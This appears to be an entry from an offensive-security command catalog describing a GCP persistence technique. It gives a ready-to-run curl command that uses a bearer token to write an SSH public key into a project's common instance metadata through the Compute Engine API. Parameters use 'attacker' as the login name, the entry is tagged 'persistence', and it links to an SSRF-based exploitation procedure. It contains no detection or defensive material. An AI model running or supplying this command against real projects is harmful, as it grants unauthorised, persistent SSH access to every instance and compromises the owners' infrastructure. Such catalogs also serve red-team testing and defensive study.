---
id: 5d29e976-bddb-45f0-bd9f-b16e9f4fddae
name: gcp-add-ssh-key-via-metadata-api
type: command
executor: bash
data: >-
  curl -X POST
  "https://www.googleapis.com/compute/v1/projects/$_PROJECT_ID/setCommonInstanceMetadata"
  -H "Authorization: Bearer $_ACCESS_TOKEN" -H "Content-Type: application/json"
  --data '{"items": [{"key": "ssh-keys", "value":
  "$_SSH_USERNAME:$_SSH_PUBLIC_KEY"}]}'
output: null
created_at: '2023-04-06T03:56:38.401394+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - GCP
tags:
  - gcp
  - ssh
  - metadata
  - persistence
verified: true
validated: true
---

# gcp-add-ssh-key-via-metadata-api

## Command

```bash
curl -X POST "https://www.googleapis.com/compute/v1/projects/$_PROJECT_ID/setCommonInstanceMetadata" \
  -H "Authorization: Bearer $_ACCESS_TOKEN" \
  -H "Content-Type: application/json" \
  --data '{"items": [{"key": "ssh-keys", "value": "$_SSH_USERNAME:$_SSH_PUBLIC_KEY"}]}'
```

## Description

Adds an SSH public key to the GCP project's common instance metadata via the Compute Engine API, allowing SSH access to instances in that project.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_PROJECT_ID | GCP project ID (e.g., 1042377752888) | Yes |
| $_ACCESS_TOKEN | Valid service account access token with compute scope | Yes |
| $_SSH_USERNAME | Username for SSH login (e.g., attacker) | Yes |
| $_SSH_PUBLIC_KEY | Public key content (e.g., ssh-rsa AAAAB3NzaC1yc2E...) | Yes |
| -X POST | HTTP method for creating metadata | Built-in |
| -H Authorization | Bearer token header | Built-in |
| -H Content-Type | JSON payload header | Built-in |
| --data | JSON payload with ssh-keys item | Built-in |

## Examples

### Basic Usage

```bash
curl -X POST "https://www.googleapis.com/compute/v1/projects/my-project/setCommonInstanceMetadata" \
  -H "Authorization: Bearer ya29..." \
  -H "Content-Type: application/json" \
  --data '{"items": [{"key": "ssh-keys", "value": "attacker:ssh-rsa AAAAB3Nza..."}]}'
```

## Expected Output

```json
{
  "name": "operation-123",
  "targetLink": "...",
  "status": "DONE"
}
```

A 200 response indicates success; the key applies project-wide.

## Related

- [[procedures/Exploit-SSRF-to-Add-SSH-Key-to-GCP-Instance]]
